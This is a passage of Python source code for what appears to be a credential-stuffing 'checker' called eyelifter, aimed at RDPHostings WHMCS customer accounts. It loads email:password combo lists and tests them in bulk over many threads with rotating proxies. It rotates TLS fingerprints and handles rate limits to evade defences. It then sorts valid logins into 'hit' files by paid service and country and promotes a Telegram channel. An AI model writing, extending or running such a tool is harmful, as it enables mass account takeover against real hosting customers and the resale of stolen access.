                due_s = s.get("next_due_iso") or s.get("next_due_raw") or "-"
                dl_s = s.get("days_left_str") or "-"
                cyc = s.get("cycle") or "-"
                reg = (s.get("reg_date_iso") or "-")[:10]
                print(f"  {marker} {s['name']:24s}  ${s['amount']:>6.2f} "
                      f"{s['currency']:4s}  [{s['status_label']:10s}]  "
                      f"due={due_s:12s} ({dl_s:12s})  "
                      f"reg={reg:10s}  {cyc:14s}  id={s['id']}")
        if enr["invoices"]:
            print(eyelifter_color("96", "── invoices [eyelifter] ──", True))
            for i in enr["invoices"]:
                dl_s = i.get("days_left_str") or "-"
                print(f"    #{i['id']:8s}  ${i['amount']:>7.2f} "
                      f"{i['currency']:4s}  [{i['status']:10s}]  ({dl_s})")
    elif st == "bad":
        eyelifter_log("❌", "ERROR", "RESULT",
                      f"bad creds - {result.get('reason', 'invalid')} [eyelifter]")
    else:
        eyelifter_log("❌", "ERROR", "RESULT",
            f"{result.get('error_type', '')} – {result.get('msg', '')} [eyelifter]")

    if _loader.settings.get("debug", False):
        eyelifter_log("🐛", "DEBUG", "DUMP",
            f"session folder: {_FOLDER} (see Debug/ subfolder) [eyelifter]")

    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] Enter to continue...')}")


def eyelifter_bulk_check(proxies):
    global _TOTAL, _HIT_F, _FREE_F, _NONE_F, _BAD_F, _ERR_F, _FOLDER
    global _POOL, _BADP, _SVCSETS

    eyelifter_reset_stats()
    eyelifter_section("BULK CHECK [eyelifter]")

    path = input(f"{eyelifter_color('96', '[*] combo file > ')}").strip()
    if not path or not os.path.isfile(path):
        eyelifter_log("❌", "ERROR", "FILE", "file not found [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    combos = eyelifter_extract_combos(content)
    if not combos:
        eyelifter_log("❌", "ERROR", "EXTRACT", "no valid email:password combos [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos [eyelifter]")

    new_threads = eyelifter_ask_threads()
    if proxies and new_threads > len(proxies):
        eyelifter_log("⚠️", "WARN", "PROXY",
            f"{new_threads} threads vs {len(proxies)} proxies — "
            f"proxies will be shared [eyelifter]")
    if new_threads != _loader.settings["threads"]:
        _loader.settings["threads"] = new_threads
        try:
            _loader.save()
        except Exception:
            pass
    eyelifter_log("⚙️", "INFO", "THREADS", f"{_loader.settings['threads']} [eyelifter]")

    root = os.path.join(os.path.dirname(CFG_PATH), RESULTS)
    os.makedirs(root, exist_ok=True)

    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _FOLDER = os.path.join(root, f"Session_{ts}_{tag}")
    os.makedirs(_FOLDER, exist_ok=True)

    try:
        (_HIT_F, _FREE_F, _NONE_F, _BAD_F, _ERR_F) = eyelifter_open_files(_FOLDER)
    except Exception as e:
        eyelifter_log("❌", "ERROR", "OPEN", f"could not open result files: {e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    header = (f"# RDPHostings Checker by eyelifter - {datetime.now().isoformat()}\n"
              f"# Checked by eyelifter\n# Seal: {SEAL}\n"
              f"# Credit: eyelifter | {TG_USER} | {TG_CHAN}\n"
              f"# Debug: {_loader.settings.get('debug', False)}\n\n")
    for fh in (_HIT_F, _FREE_F, _NONE_F, _BAD_F, _ERR_F):
        fh.write(header)

    _TOTAL = len(combos)
    eyelifter_log("📊", "INFO", "FILE", f"loaded {_TOTAL} [eyelifter]")

    if proxies:
        _POOL = list(proxies)
        _BADP = set()
        eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} loaded [eyelifter]")
    else:
        _POOL = []
        _BADP = set()
        eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct [eyelifter]")

    _STOP.clear()
    eyelifter_log("🚀", "INFO", "START",
        f"firing {_TOTAL} combos across {_loader.settings['threads']} threads "
        f"| {TG_USER} | {TG_CHAN} [eyelifter]")

    try:
        bulk_runner(combos)
    except KeyboardInterrupt:
        _STOP.set()
        eyelifter_log("🛑", "WARN", "STOP", "stopping... [eyelifter]")
    except Exception as e:
        eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]} [eyelifter]")
    finally:
        _STOP.set()
        time.sleep(0.3)
        for fh in (_HIT_F, _FREE_F, _NONE_F, _BAD_F, _ERR_F):
            try:
                fh.close()
            except Exception:
                pass

    with _LK:
        snap = dict(_ST)
        ssnap = {k: len(v) for k, v in _SVCSETS.items()}
        csnap = {k: len(v) for k, v in _CTRY_SETS.items()}

    for base, key in (
        ("rdp_hits.txt", "hit"),
        ("rdp_free.txt", "free"),
        ("rdp_none.txt", "none"),
        ("rdp_bad.txt", "bad"),
        ("rdp_errors.txt", "errors"),
    ):
        old = os.path.join(_FOLDER, base)
        new = os.path.join(_FOLDER, base.replace(".txt", f"_{snap[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    eyelifter_log("💾", "INFO", "SAVE", f"results → {_FOLDER} [eyelifter]")
    eyelifter_divider()
    el = time.time() - _START
    eyelifter_summary([
        ("Total", _TOTAL),
        ("HIT (paid)", snap["hit"]),
        ("FREE", snap["free"]),
        ("NONE", snap["none"]),
        ("Bad creds", snap["bad"]),
        ("Errors", snap["errors"]),
        ("Rate limited", snap["rl"]),
        ("Temp retries", snap.get("temp", 0)),
        ("Proxy fails", snap["pfails"]),
        ("Time", f"{el:.1f}s"),
        ("Speed", f"{_TOTAL / max(el, 0.001):.2f} combo/s"),
        ("Folder", _FOLDER),
        ("Credit", f"eyelifter · {TG_USER} · {TG_CHAN}"),
    ])
    if ssnap:
        print(eyelifter_color("96", "── paid service breakdown [eyelifter] ──", True))
        for s, cnt in sorted(ssnap.items(), key=lambda x: x[1], reverse=True):
            print(f"  {s:45s}  {cnt} accounts")
    if csnap:
        print(eyelifter_color("96", "── country breakdown [eyelifter] ──", True))
        for c, n in sorted(csnap.items(), key=lambda x: x[1], reverse=True):
            print(f"  {c:4s}  {n} accounts")
    if _loader.settings.get("debug", False):
        eyelifter_log("🐛", "DEBUG", "DUMP",
            f"session folder: {_FOLDER} (see Debug/ subfolder) [eyelifter]")
    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] Enter to continue...')}")


single_check = eyelifter_single_check
bulk_check = eyelifter_bulk_check


def eyelifter_settings_menu():
    eyelifter_section("SETTINGS [eyelifter]")
    s = _loader.settings
    print(f"  [1]  Threads:              {s['threads']}  (1-{MAX_THREADS})")
    print(f"  [2]  Timeout:              {s['timeout']}s")
    print(f"  [3]  Retries:              {s['retries']}  (0-6)")
    print(f"  [4]  Combo Delay:          {s['combo_delay']}s")
    print(f"  [5]  Proxy File:           {s['proxies_file']}")
    print(f"  [6]  Skip Proxy Test:      {s['skip_proxy_test']}")
    print(f"  [7]  Rate-limit Delay:     {s['rate_limit_delay']}s")
    print(f"  [8]  FP Rotate:            {s['fp_rotate']}  (session/attempt/fixed)")
    print(f"  [9]  FP Pool:              {s['fp_pool'] or 'auto'}")
    print(f"  [10] FP Jitter (TLS/H2):   {s['fp_jitter']}")
    print(f"  [11] Debug dumps:          {s['debug']}")
    print(f"  [12] Min Price For Hit:    ${s['min_price_for_hit']}")
    print(f"  [0]  Back")

    ch = input(f"{eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False
    try:
        if ch == "1":
            s["threads"] = max(1, min(MAX_THREADS, int(input(f"Threads (1-{MAX_THREADS}): "))))
            changed = True
        elif ch == "2":
            s["timeout"] = max(5, min(120, int(input("Timeout (5-120): "))))
            changed = True
        elif ch == "3":
            s["retries"] = max(0, min(6, int(input("Retries (0-6): "))))
            changed = True
        elif ch == "4":
            s["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            changed = True
        elif ch == "5":
            v = input("Proxies file: ").strip()
            if v:
                s["proxies_file"] = v
                changed = True
        elif ch == "6":
            s["skip_proxy_test"] = not s["skip_proxy_test"]
            changed = True
        elif ch == "7":
            s["rate_limit_delay"] = max(1, min(120, int(input("Rate-limit delay (s): "))))
            changed = True
        elif ch == "8":
            v = input("FP rotate (session/attempt/fixed) [blank=session]: ").strip().lower()
            s["fp_rotate"] = v if v in ("session", "attempt", "fixed") else "session"
            changed = True
        elif ch == "9":
            v = input("FP pool (comma list, blank=auto): ").strip()
            s["fp_pool"] = v
            reset_fp_cycle()
            changed = True
        elif ch == "10":
            s["fp_jitter"] = not s["fp_jitter"]
            reset_fp_cycle()
            changed = True
        elif ch == "11":
            s["debug"] = not s["debug"]
            changed = True
        elif ch == "12":
            s["min_price_for_hit"] = max(0.0, float(input("Min price for hit: ")))
            changed = True
        elif ch == "0":
            return
    except (ValueError, TypeError):
        eyelifter_log("❌", "ERROR", "CONFIG", "invalid [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if changed:
        try:
            _loader.save()
            eyelifter_log("💾", "INFO", "CONFIG", "saved [eyelifter]")
        except Exception as e:
            eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
settings_menu = eyelifter_settings_menu


def eyelifter_main():
    eyelifter_verify("main")
    if _loader.settings.get("open_channel_on_launch", True):
        def _open():
            time.sleep(0.4)
            try:
                for cmd in ("termux-open-url", "xdg-open", "open"):
                    if shutil.which(cmd):
                        subprocess.Popen(
                            [cmd, f"https://t.me/{TG_CHAN.lstrip('@')}"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL, start_new_session=True,
                            close_fds=True)
                        return
            except Exception:
                pass
        threading.Thread(target=_open, daemon=True).start()

    eyelifter_banner(TOOL, "RDPHostings WHMCS Checker")
    fp = pick_fp(peek=True)
    eyelifter_log("🧬", "INFO", "FINGERPRINT",
        f"{len(_fp_targets())} targets · rotate={_loader.settings.get('fp_rotate')}"
        f"{' · jitter' if _loader.settings.get('fp_jitter') else ''}"
        f" · eg {fp['imp']} [eyelifter]")
    eyelifter_log("📣", "INFO", "CREDIT",
        f"eyelifter · {TG_USER} · {TG_CHAN} [eyelifter]")
    eyelifter_log("🐛", "INFO", "DEBUG",
        f"{'ON — dumping every response' if _loader.settings.get('debug') else 'OFF'} [eyelifter]")
    proxies = eyelifter_load_proxies()

    while True:
        eyelifter_verify("menu")
        eyelifter_section(f"MAIN MENU · {TG_USER} · {TG_CHAN} [eyelifter]")
        if proxies:
            eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded [eyelifter]")
        else:
            eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct [eyelifter]")
        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Exit")
        choice = input(f"{eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            eyelifter_single_check(proxies)
        elif choice == "2":
            _STOP.clear()
            eyelifter_bulk_check(proxies)
        elif choice == "3":
            eyelifter_settings_menu()
            proxies = eyelifter_load_proxies()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            eyelifter_log("❌", "ERROR", "INPUT", "invalid choice [eyelifter]")


main = eyelifter_main

if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        print(f"[FATAL] {type(e).__name__}: {e}")